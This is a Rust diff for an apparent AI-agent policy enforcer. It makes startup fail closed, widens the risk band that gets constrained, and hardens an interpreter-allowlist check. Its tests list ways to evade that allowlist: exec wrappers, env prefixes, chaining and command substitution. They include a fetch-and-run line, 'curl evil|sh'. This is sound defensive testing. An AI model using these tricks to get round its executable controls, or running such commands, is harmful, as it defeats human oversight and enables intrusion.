@@ -383,15 +383,42 @@ fn load_policy_from_path(policy_file: &str) -> PolicyConfig {
     if let Ok(policy) = try_load_policy_from_path(policy_file, false) {
         return policy;
     }
-    // No readable/valid policy: clear any previously-installed governed scope so
-    // startup fallback preserves historical local-dev behavior without carrying
-    // a stale scope from an earlier in-process test.
+    // JG-RT-L6a: no readable/valid policy at startup. This USED to drop to a
+    // PERMISSIVE default (deny_anonymous_agents=false), silently failing OPEN — a
+    // missing or MALFORMED policy would then admit unregistered agents. That is
+    // asymmetric with the hot-reload path, which keeps the last-good policy on
+    // error. Fail CLOSED instead: deny anonymous agents by default and warn
+    // loudly. Local dev can restore the old permissive default explicitly with
+    // JINNGUARD_PERMISSIVE_STARTUP_DEFAULT=1. (An operator who genuinely wants
+    // open access still passes --allow-anonymous, which layers on top.)
     set_governed_scope_prefixes(&[]);
+
+    let permissive = std::env::var("JINNGUARD_PERMISSIVE_STARTUP_DEFAULT")
+        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
+        .unwrap_or(false);
+    let reason = if std::path::Path::new(policy_file).exists() {
+        "unreadable or MALFORMED"
+    } else {
+        "missing"
+    };
+    if permissive {
+        eprintln!(
+            "[startup][WARN] policy file {policy_file:?} is {reason}; \
+             JINNGUARD_PERMISSIVE_STARTUP_DEFAULT is set -> using the PERMISSIVE \
+             default (deny_anonymous_agents=false). Do NOT use this in production."
+        );
+    } else {
+        eprintln!(
+            "[startup][WARN] policy file {policy_file:?} is {reason}; failing CLOSED \
+             to a restrictive default (deny_anonymous_agents=true). Fix the policy \
+             file, or set JINNGUARD_PERMISSIVE_STARTUP_DEFAULT=1 for local dev."
+        );
+    }
     PolicyConfig {
         upper_safety_boundary: 75.0,
         minimum_trust_score: 25.0,
         agent_nodes: HashMap::new(),
-        deny_anonymous_agents: false,
+        deny_anonymous_agents: !permissive,
         allow_anonymous_override: false,
         network_policy: NetworkPolicy::default(),
         runtime_policy: RuntimePolicy::default(),
@@ -913,12 +940,23 @@ pub(crate) fn policy_decision(
     if assessment.trust_score < policy.minimum_trust_score {
         return PolicyDecision::deny("trust_floor_breached", assessment);
     }
-    // CONSTRAIN band: 40%–75% of the safety ceiling.
+    // CONSTRAIN band: from 40% of the ceiling up to the ceiling itself. Anything
+    // ABOVE the ceiling was already hard-denied above, so every remaining action at
+    // or over the 40% floor gets guardrails (rate limit, output cap, and — for the
+    // upper portion — output redaction).
+    //
+    // JG-RT-PD1: the upper bound used to be 0.75*ceiling, which let the HIGHEST
+    // sub-ceiling band [0.75*ceiling, ceiling] fall through to an UNCONSTRAINED
+    // allow — a non-monotonic inversion where the riskiest permitted actions got
+    // the fewest guardrails (no rate limit, no output cap, no redaction). The band
+    // now extends to the ceiling so restriction increases monotonically with risk.
+    // The redaction threshold is unchanged (0.75*0.85*ceiling), so behaviour below
+    // 0.75*ceiling is identical to before; only the high band flips allow→constrain.
     let constrain_lower = policy.upper_safety_boundary * 0.40;
-    let constrain_upper = policy.upper_safety_boundary * 0.75;
-    if assessment.fused_risk >= constrain_lower && assessment.fused_risk < constrain_upper {
+    let redact_threshold = policy.upper_safety_boundary * 0.75 * 0.85;
+    if assessment.fused_risk >= constrain_lower {
         let constraints = ConstraintSet {
-            redact_output: assessment.fused_risk >= constrain_upper * 0.85,
+            redact_output: assessment.fused_risk >= redact_threshold,
             rate_limit_rps: Some(5),
             allowed_network_destinations: vec![],
             output_byte_limit: Some(65_536),
@@ -1206,20 +1244,190 @@ fn interpreter_name(token: &str) -> Option<&'static str> {
     KNOWN_INTERPRETERS.iter().copied().find(|i| *i == base)
 }
 
-/// Interpreter invoked by a proposed action, if any.
-fn proposal_invoked_interpreter(action: &ProposedAction) -> Option<&'static str> {
-    match action {
-        ProposedAction::ShellCommand { command } => {
-            command.split_whitespace().next().and_then(interpreter_name)
+/// Strip one layer of surrounding single/double quotes and whitespace.
+fn unquote(token: &str) -> &str {
+    let t = token.trim();
+    let t = t.strip_prefix(['"', '\'']).unwrap_or(t);
+    t.strip_suffix(['"', '\'']).unwrap_or(t)
+}
+
+/// A leading `NAME=value` shell environment assignment — not a command to run.
+/// `FOO=bar python3 -c ...` executes `python3`, not `FOO=bar`.
+fn is_env_assignment(token: &str) -> bool {
+    match token.find('=') {
+        None | Some(0) => false,
+        Some(eq) => {
+            let name = &token[..eq];
+            name.chars()
+                .next()
+                .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
+                && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
         }
-        _ => None,
     }
+}
+
+/// A bare numeric / duration positional argument to an exec wrapper (e.g.
+/// `timeout 5`, `timeout 5s`, `nice -n 10`) — never a command head, so it is
+/// skipped when resolving the wrapped command.
+fn is_numeric_arg(token: &str) -> bool {
+    let stripped = token.trim_end_matches(['s', 'm', 'h', 'd']);
+    !stripped.is_empty() && stripped.chars().all(|c| c.is_ascii_digit())
+}
+
+/// Exec wrappers that run a *following* command, so the real interpreter is a
+/// later token: `env python3 -c`, `timeout 5 bash -c`, `sudo nice perl …`,
+/// `nohup ruby …`. Each consumes its own leading flags / `NAME=val` / numeric
+/// args before the wrapped command head.
+const COMMAND_WRAPPERS: &[&str] = &[
+    "env",
+    "timeout",
+    "nohup",
+    "nice",
+    "ionice",
+    "stdbuf",
+    "setsid",
+    "time",
+    "xargs",
+    "sudo",
+    "doas",
+    "command",
+    "exec",
+    "chroot",
+    "unshare",
+    "flock",
+    "watch",
+    "eatmydata",
+    "proxychains",
+    "strace",
+    "ltrace",
+];
+
+/// Resolve the effective command head of a single command segment: skip leading
+/// `NAME=value` environment assignments and known exec wrappers (and each
+/// wrapper's own option / `NAME=val` args) so `env FOO=1 python3 -c` and
+/// `sudo -n nice bash -c` both resolve to the wrapped interpreter basename.
+fn effective_command_head<'a>(tokens: &[&'a str]) -> Option<&'a str> {
+    let mut i = 0;
+    loop {
+        while i < tokens.len() && is_env_assignment(unquote(tokens[i])) {
+            i += 1;
+        }
+        let base = binary_basename(unquote(tokens.get(i)?));
+        if COMMAND_WRAPPERS.contains(&base) {
+            i += 1;
+            while i < tokens.len() {
+                let a = unquote(tokens[i]);
+                if a.starts_with('-') || is_env_assignment(a) || is_numeric_arg(a) {
+                    i += 1;
+                } else {
+                    break;
+                }
+            }
+            // Re-resolve: the wrapped head may itself be another wrapper.
+            continue;
+        }
+        return Some(base);
+    }
+}
+
+/// Split a shell command into top-level command segments, honoring single- and
+/// double-quoted regions (a `;`/`|`/`&` inside a quoted argument does NOT start
+/// a new command, so a literal string argument is never mistaken for an
+/// interpreter invocation) and descending into one level of command
+/// substitution (`$(...)`, backticks) except inside single quotes, where the
+/// shell suppresses substitution.
+fn shell_command_segments(command: &str) -> Vec<String> {
+    let mut segments = Vec::new();
+    let mut cur = String::new();
+    let mut chars = command.chars().peekable();
+    let mut in_single = false;
+    let mut in_double = false;
+    let flush = |cur: &mut String, out: &mut Vec<String>| {
+        if !cur.trim().is_empty() {
+            out.push(std::mem::take(cur));
+        } else {
+            cur.clear();
+        }
+    };
+    while let Some(c) = chars.next() {
+        if in_single {
+            if c == '\'' {
+                in_single = false;
+            }
+            cur.push(c);
+            continue;
+        }
+        match c {
+            '\'' => {
+                in_single = true;
+                cur.push(c);
+            }
+            '"' => {
+                in_double = !in_double;
+                cur.push(c);
+            }
+            '`' => {
+                let mut inner = String::new();
+                for n in chars.by_ref() {
+                    if n == '`' {
+                        break;
+                    }
+                    inner.push(n);
+                }
+                segments.extend(shell_command_segments(&inner));
+            }
+            '$' if chars.peek() == Some(&'(') => {
+                chars.next(); // consume '('
+                let mut depth = 1u32;
+                let mut inner = String::new();
+                for n in chars.by_ref() {
+                    match n {
+                        '(' => {
+                            depth += 1;
+                            inner.push(n);
+                        }
+                        ')' => {
+                            depth -= 1;
+                            if depth == 0 {
+                                break;
+                            }
+                            inner.push(n);
+                        }
+                        _ => inner.push(n),
+                    }
+                }
+                segments.extend(shell_command_segments(&inner));
+            }
+            ';' | '\n' | '|' | '&' if !in_double => flush(&mut cur, &mut segments),
+            _ => cur.push(c),
+        }
+    }
+    flush(&mut cur, &mut segments);
+    segments
+}
+
+/// Every known interpreter invoked anywhere in a shell command — walking command
+/// separators, leading env-assignments, exec wrappers, and one level of command
+/// substitution. Defence-in-depth over the naive first-token check; on
+/// enterprise builds the kernel bprm-exec allowlist (`jg_bprm_check_security`)
+/// remains the authority, this is the userspace mediation layer (JG-RT-M4a).
+fn interpreters_in_command(command: &str) -> Vec<&'static str> {
+    let mut found: Vec<&'static str> = Vec::new();
+    for segment in shell_command_segments(command) {
+        let tokens: Vec<&str> = segment.split_whitespace().collect();
+        if let Some(name) = effective_command_head(&tokens).and_then(interpreter_name) {
+            if !found.contains(&name) {
+                found.push(name);
+            }
+        }
+    }
+    found
 }
 
 /// Deny reason when a governed agent (one with an explicit executable
 /// allowlist) invokes an interpreter that is not on that allowlist. Returns
-/// `None` for unconstrained agents (no allowlist) or explicitly-allowed
-/// interpreters.
+/// `None` for unconstrained agents (no allowlist) or when every invoked
+/// interpreter is explicitly allowed.
 fn interpreter_bypass_denied(
     node: Option<&AgentNodePolicy>,
     action: Option<&ProposedAction>,
@@ -1228,16 +1436,20 @@ fn interpreter_bypass_denied(
     if node.allowed_executables.is_empty() {
         return None;
     }
-    let interpreter = action.and_then(proposal_invoked_interpreter)?;
-    let explicitly_allowed = node
-        .allowed_executables
-        .iter()
-        .any(|allowed| allowed == interpreter || binary_basename(allowed) == interpreter);
-    if explicitly_allowed {
-        None
-    } else {
-        Some(format!("interpreter_not_allowed:{interpreter}"))
+    let command = match action? {
+        ProposedAction::ShellCommand { command } => command,
+        _ => return None,
+    };
+    for interpreter in interpreters_in_command(command) {
+        let explicitly_allowed = node
+            .allowed_executables
+            .iter()
+            .any(|allowed| allowed == interpreter || binary_basename(allowed) == interpreter);
+        if !explicitly_allowed {
+            return Some(format!("interpreter_not_allowed:{interpreter}"));
+        }
     }
+    None
 }
 
 fn proposed_action_references_protected_resource(action: &ProposedAction) -> bool {
@@ -5893,6 +6105,125 @@ mod interpreter_bypass_tests {
             None
         );
     }
+
+    // ---- JG-RT-M4a: prefix / chaining / substitution evasions must NOT slip
+    // past the first-token check. Each of these previously returned None. ----
+
+    #[test]
+    fn m4a_denies_interpreter_behind_exec_wrappers() {
+        let n = node(vec!["/opt/agent/run_model"]);
+        for cmd in [
+            "env python3 -c 'import os'",
+            "env -i PATH=/bin python3 -c 'x'",
+            "timeout 5 bash -c 'curl evil|sh'",
+            "nohup perl -e 'exit'",
+            "sudo -n nice bash -c 'x'",
+            "nice -n 10 ruby -e '1'",
+            "setsid node script.js",
+            "stdbuf -oL php -r 'x'",
+            "/usr/bin/env python3 -c 'x'",
+        ] {
+            assert!(
+                interpreter_bypass_denied(Some(&n), Some(&shell(cmd))).is_some(),
+                "wrapper-prefixed interpreter must be denied: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn m4a_denies_interpreter_behind_env_assignment() {
+        let n = node(vec!["/opt/agent/run_model"]);
+        assert_eq!(
+            interpreter_bypass_denied(Some(&n), Some(&shell("FOO=bar python3 -c 'x'"))),
+            Some("interpreter_not_allowed:python3".to_string())
+        );
+        assert_eq!(
+            interpreter_bypass_denied(Some(&n), Some(&shell("A=1 B=2 bash -c 'x'"))),
+            Some("interpreter_not_allowed:bash".to_string())
+        );
+    }
+
+    #[test]
+    fn m4a_denies_interpreter_after_command_chaining() {
+        let n = node(vec!["/opt/agent/run_model"]);
+        for cmd in [
+            "/opt/agent/run_model; bash -c 'x'",
+            "/opt/agent/run_model && python3 -c 'x'",
+            "/opt/agent/run_model || sh -c 'x'",
+            "true & perl -e '1'",
+            "/opt/agent/run_model\nnode evil.js",
+            "cat data | python3",
+        ] {
+            assert!(
+                interpreter_bypass_denied(Some(&n), Some(&shell(cmd))).is_some(),
+                "chained/piped interpreter must be denied: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn m4a_denies_interpreter_in_command_substitution() {
+        let n = node(vec!["/opt/agent/run_model"]);
+        for cmd in [
+            "echo $(python3 -c 'print(1)')",
+            "/opt/agent/run_model --x `perl -e 'print 1'`",
+            "echo \"$(bash -c id)\"",
+        ] {
+            assert!(
+                interpreter_bypass_denied(Some(&n), Some(&shell(cmd))).is_some(),
+                "substituted interpreter must be denied: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn m4a_allowed_interpreter_through_wrapper_permitted() {
+        // An explicitly allowlisted interpreter is still allowed even behind a
+        // wrapper — the guard denies UNLISTED interpreters, not wrappers per se.
+        let n = node(vec!["/usr/bin/python3", "/opt/agent/run_model"]);
+        assert_eq!(
+            interpreter_bypass_denied(Some(&n), Some(&shell("env python3 train.py"))),
+            None
+        );
+        assert_eq!(
+            interpreter_bypass_denied(Some(&n), Some(&shell("timeout 60 python3 train.py"))),
+            None
+        );
+    }
+
+    #[test]
+    fn m4a_quoted_separator_is_not_a_false_positive() {
+        // A literal `;`/`|`/interpreter-name inside a quoted argument must NOT be
+        // read as a second command — the agent runs run_model, not python3.
+        let n = node(vec!["/opt/agent/run_model"]);
+        assert_eq!(
+            interpreter_bypass_denied(
+                Some(&n),
+                Some(&shell(
+                    "/opt/agent/run_model --msg 'run python3 later; or sh'"
+                ))
+            ),
+            None
+        );
+        assert_eq!(
+            interpreter_bypass_denied(
+                Some(&n),
+                Some(&shell("/opt/agent/run_model --note 'a|b python3'"))
+            ),
+            None
+        );
+    }
+
+    #[test]
+    fn m4a_reports_first_unlisted_interpreter() {
+        // Chaining an allowed then an unlisted interpreter still denies on the
+        // unlisted one.
+        let n = node(vec!["/usr/bin/python3", "/opt/agent/run_model"]);
+        assert_eq!(
+            interpreter_bypass_denied(Some(&n), Some(&shell("python3 a.py && bash -c 'x'"))),
+            Some("interpreter_not_allowed:bash".to_string())
+        );
+    }
 }
 
 /// Policy-driven enforcement scope (M3). Verifies the model is additive
@@ -5902,8 +6233,8 @@ mod interpreter_bypass_tests {
 #[cfg(test)]
 mod governed_scope_tests {
     use super::{
-        is_base_system_path, is_enforcement_target, is_path_in_test_scope, path_is_governed,
-        set_governed_scope_prefixes, try_load_policy_from_path,
+        is_base_system_path, is_enforcement_target, is_path_in_test_scope, load_policy_from_path,
+        path_is_governed, set_governed_scope_prefixes, try_load_policy_from_path,
     };
     use std::sync::Mutex;
     use std::{fs, path::PathBuf};
@@ -6018,6 +6349,44 @@ mod governed_scope_tests {
             "failed reload must leave last good governed scope intact"
         );
         let _ = fs::remove_file(path);
+        reset();
+    }
+
+    #[test]
+    fn startup_policy_fallback_fails_closed_on_missing_or_malformed() {
+        // JG-RT-L6a: a missing/unreadable/malformed policy at startup must fail
+        // CLOSED (deny anonymous agents), not drop to a permissive default.
+        let _g = SCOPE_TEST_LOCK.lock().unwrap();
+        reset();
+        std::env::remove_var("JINNGUARD_PERMISSIVE_STARTUP_DEFAULT");
+
+        // Missing file → fail closed.
+        let missing = temp_policy_path("does_not_exist");
+        let _ = fs::remove_file(&missing);
+        let p = load_policy_from_path(missing.to_str().unwrap());
+        assert!(
+            p.deny_anonymous_agents,
+            "missing startup policy must fail CLOSED (deny_anonymous_agents=true)"
+        );
+
+        // Malformed file → also fail closed.
+        let bad = temp_policy_path("malformed_startup");
+        fs::write(&bad, "global_safety_ceiling: [not-valid").unwrap();
+        let p2 = load_policy_from_path(bad.to_str().unwrap());
+        assert!(
+            p2.deny_anonymous_agents,
+            "malformed startup policy must fail CLOSED"
+        );
+        let _ = fs::remove_file(&bad);
+
+        // Explicit local-dev opt-out restores the permissive default.
+        std::env::set_var("JINNGUARD_PERMISSIVE_STARTUP_DEFAULT", "1");
+        let p3 = load_policy_from_path(missing.to_str().unwrap());
+        assert!(
+            !p3.deny_anonymous_agents,
+            "JINNGUARD_PERMISSIVE_STARTUP_DEFAULT=1 must restore permissive default"
+        );
+        std::env::remove_var("JINNGUARD_PERMISSIVE_STARTUP_DEFAULT");
         reset();
     }
 
@@ -6259,6 +6628,34 @@ mod decision_property_tests {
             if d.is_allow() {
                 assert!(fused <= ceiling, "ALLOW implies risk within ceiling");
                 assert!(trust >= 100.0 - ceiling, "ALLOW implies trust above floor");
+            }
+        }
+    }
+
+    /// INVARIANT (JG-RT-PD1): restriction is monotonic in risk. Any finite risk at
+    /// or above the constrain floor (0.40*ceiling) but not over the ceiling must be
+    /// CONSTRAINed, never plain-ALLOWed — otherwise the riskiest permitted actions
+    /// would get fewer guardrails than mid-band ones. Below the floor: ALLOW.
+    #[test]
+    fn prop_policy_decision_constrains_up_to_ceiling() {
+        let mut rng = Rng(0x00C0_FFEE_1234_5678);
+        for _ in 0..100_000 {
+            let ceiling = 1.0 + rng.frac(98.0); // (1, 99)
+            let fused = rng.frac(ceiling); // finite, within [0, ceiling]
+            let trust = 100.0; // above any floor, so trust never forces a deny
+            let d = policy_decision(&assess(fused, trust), &policy(ceiling));
+            let floor = ceiling * 0.40;
+            if fused >= floor {
+                assert_eq!(
+                    d.verdict,
+                    PolicyVerdict::Constrain,
+                    "risk {fused} in [{floor}, {ceiling}] must CONSTRAIN, not allow"
+                );
+            } else {
+                assert!(
+                    d.is_allow(),
+                    "risk {fused} below floor {floor} should allow"
+                );
             }
         }
     }
